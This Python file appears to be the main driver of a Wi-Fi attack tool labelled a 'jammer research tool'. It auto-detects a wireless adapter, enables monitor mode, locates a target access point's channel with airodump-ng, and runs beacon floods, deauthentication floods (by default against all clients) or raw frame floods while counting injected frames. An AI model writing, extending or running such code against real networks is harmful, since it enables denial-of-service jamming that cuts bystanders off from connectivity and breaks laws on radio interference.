import argparse, time, sys, subprocess
from core.monitor import enable_monitor, disable_monitor
from core.scanner import scan
from core.channel import lock_channel
from attacks.beacon import beacon_flood
from attacks.deauth import deauth_flood
from attacks.flood import frame_flood

MODES = ["beacon", "deauth", "flood", "scan", "hop", "monitor-on", "monitor-off"]

def auto_detect_interface():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if "IEEE" in line:
            iface = line.split()[0]
            if "mon" in iface:
                continue
            check = subprocess.run(["ethtool", "-i", iface], capture_output=True, text=True)
            if "iwlwifi" not in check.stdout:
                print(f"[*] Auto-detected interface: {iface}")
                return iface
    sys.exit("[-] No suitable external wireless interface found. Plug in your adapter.")

def auto_detect_channel(mon_iface, bssid):
    print(f"[*] Scanning for BSSID {bssid} to detect channel...")
    subprocess.run(
        ["sudo", "airodump-ng", "--output-format", "csv",
         "-w", "/tmp/s007_scan", "--write-interval", "2", mon_iface],
        capture_output=True, text=True, timeout=10
    )
    try:
        with open("/tmp/s007_scan-01.csv") as f:
            for line in f:
                if bssid.lower() in line.lower():
                    parts = line.split(",")
                    channel = int(parts[3].strip())
                    print(f"[*] Auto-detected channel: {channel}")
                    return channel
    except Exception:
        pass
    print("[!] Could not auto-detect channel, defaulting to 6")
    return 6

def parse_args():
    p = argparse.ArgumentParser(description="S007 — Wi-Fi Jammer Research Tool")
    p.add_argument("--iface",         default=None)
    p.add_argument("--mode",          required=True, choices=MODES)
    p.add_argument("--channel",       type=int,      default=None)
    p.add_argument("--bssid",         default=None)
    p.add_argument("--client",        default="ff:ff:ff:ff:ff:ff")
    p.add_argument("--rate",          type=int,      default=500)
    p.add_argument("--duration",      type=int,      default=60)
    p.add_argument("--skip-monitor",  action="store_true",
                   help="Use existing monitor interface (wlan0mon)")
    return p.parse_args()

def _run_attack(args, mon_iface, disable_on_exit=True):
    try:
        if args.mode == "scan":
            results = scan(mon_iface, timeout=args.duration)
            print(f"\n[*] Found {len(results)} access points.")
            return

        if args.mode == "monitor-on":
            print(f"[+] Monitor mode active on {mon_iface}"); return

        if args.mode == "monitor-off":
            print(f"[+] Monitor mode will be disabled on exit"); return

        if args.mode == "hop":
            from core.channel import hop_channels
            import threading
            stop_hop = threading.Event()
            t = threading.Thread(target=hop_channels, args=(mon_iface,),
                                 kwargs={"stop_event": stop_hop}, daemon=True)
            t.start()
            print(f"[*] Hopping channels — press Ctrl+C to stop")
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                stop_hop.set()
            return

        if args.channel is None:
            args.channel = auto_detect_channel(mon_iface, args.bssid) if args.bssid else 6

        lock_channel(mon_iface, args.channel)
        counter = [0]

        if args.mode == "beacon":
            stop, counter = beacon_flood(mon_iface, args.channel,
                                         rate=args.rate, duration=args.duration,
                                         counter=counter)
        elif args.mode == "deauth":
            if not args.bssid:
                sys.exit("[-] --bssid required for deauth mode")
            stop, counter = deauth_flood(mon_iface, args.bssid,
                                         client_mac=args.client,
                                         rate=args.rate, duration=args.duration,
                                         counter=counter)
        elif args.mode == "flood":
            stop, counter = frame_flood(mon_iface, duration=args.duration,
                                        rate=args.rate, counter=counter)

        start = time.time()
        while time.time() - start < args.duration:
            print(f"\r[*] Elapsed: {time.time()-start:.0f}s | Frames sent: {counter[0]:,}", end="")
            time.sleep(1)
        stop.set()
        print(f"\n[+] Attack complete. Total frames injected: {counter[0]:,}")

    finally:
        if disable_on_exit:
            disable_monitor(mon_iface)

def main():
    args = parse_args()

    if args.skip_monitor:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        mon_iface = None
        for line in result.stdout.splitlines():
            if "IEEE" in line and "mon" in line.split()[0]:
                mon_iface = line.split()[0]
                break
        if not mon_iface:
            sys.exit("[-] No monitor interface found. Run: sudo airmon-ng start <iface>")
        print(f"[*] Using existing monitor interface: {mon_iface}")
        _run_attack(args, mon_iface, disable_on_exit=False)
    else:
        if not args.iface:
            args.iface = auto_detect_interface()
        mon_iface = enable_monitor(args.iface)
        _run_attack(args, mon_iface, disable_on_exit=True)

if __name__ == "__main__":
    main()